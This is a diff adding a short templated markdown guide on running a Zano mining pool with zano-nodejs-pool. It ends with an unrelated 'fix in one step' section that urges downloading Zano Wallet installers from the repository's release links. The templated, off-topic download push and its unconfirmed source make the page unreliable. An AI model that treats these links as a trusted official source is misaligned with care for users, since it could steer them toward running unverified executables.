@@ -1,0 +1,77 @@
+<p align="center"><img src="https://raw.githubusercontent.com/zano-projects/Zano-Wallet/main/learn/assets/04-staking-ecosystem.webp" alt="Zano Wallet - Run a Zano Mining Pool With zano-nodejs-pool" width="100%"></p>
+
+<h1 align="center">Run a Zano Mining Pool With zano-nodejs-pool</h1>
+
+<p align="center">
+<a href="https://zanowallet.io/"><img src="https://img.shields.io/badge/Website-zanowallet.io-7c5cff?style=for-the-badge" alt="Zano Wallet website"></a>
+<a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4"><img src="https://img.shields.io/badge/Release-v2.0.4-1f2a6b?style=for-the-badge" alt="Zano Wallet v2.0.4 release"></a>
+<a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn"><img src="https://img.shields.io/badge/Guides-Zano%20Wallet%20Learn-3b2a8f?style=for-the-badge" alt="Zano Wallet guides"></a>
+</p>
+
+---
+
+**Short answer:** Run a synced Zano node, configure zano-nodejs-pool with your wallet RPC, and open the stratum port to miners.
+
+## You'll see this if
+
+- You want to host a community pool
+- You are testing mining locally
+
+## Why it happens
+
+A pool collects shares from miners and pays them from a pool wallet.
+
+## How to fix it
+
+1. Run a fully synced Zano daemon.
+2. Set up a pool wallet.
+3. Clone zano-nodejs-pool and configure ports and fees.
+4. Start the pool and test with Progminer.
+5. Monitor payouts and logs.
+
+Related reading: [Mine Zano With Your GPU Using Progminer](./mine-zano-gpu-progminer.md) and the [mining overview](https://zanowallet.io/mining/).
+
+## If that didn't work
+
+If miners cannot connect, check firewall rules for the stratum port. You can also read [Zano Hybrid PoW and PoS Consensus in Plain Words](./zano-hybrid-pow-pos.md).
+
+## Prevent it next time
+
+Keep the pool wallet backed up and publish fees clearly. More on the website: [mining guide](https://zanowallet.io/guides/how-to-mine-zano/).
+
+## FAQ
+
+**Do I need Zano Wallet?**  
+Yes, for the pool payout wallet and for miners' addresses.
+
+**Can it run on Linux?**  
+Yes, it is a Node.js project.
+
+---
+
+## The fix in one step: install the latest Zano Wallet
+
+The current release, **Zano Wallet v2.0.4**, includes the latest fixes. Download it from the [tagged release](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4):
+
+[![Download Zano Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) [![Download Zano Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) [![Download Zano Wallet for Linux](https://img.shields.io/badge/Download-Linux-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip)
+
+| Platform | File | Version |
+|---|---|---|
+| Windows | [zano-wallet-2.0.4-installer.exe](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) | v2.0.4 |
+| macOS | [zano-wallet-2.0.4.dmg](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) | v2.0.4 |
+| Linux | [zano-wallet-2.0.4.zip](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip) | v2.0.4 |
+
+> [!TIP]
+> Compare the SHA-256 with the table on the [release page](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4) before running the installer.
+
+## Related guides
+
+| Guide | On the website |
+|---|---|
+| [Mine Zano With Your GPU Using Progminer](./mine-zano-gpu-progminer.md) | [mining overview](https://zanowallet.io/mining/) |
+| [Zano Hybrid PoW and PoS Consensus in Plain Words](./zano-hybrid-pow-pos.md) | [mining guide](https://zanowallet.io/guides/how-to-mine-zano/) |
+| [How to Receive ZANO in Your Wallet](./receive-zano.md) | [Zano Wallet](https://zanowallet.io/) |
+
+---
+
+<p align="center"><a href="https://zanowallet.io/">zanowallet.io</a> · <a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4">Release v2.0.4</a> · <a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn">All guides</a></p>
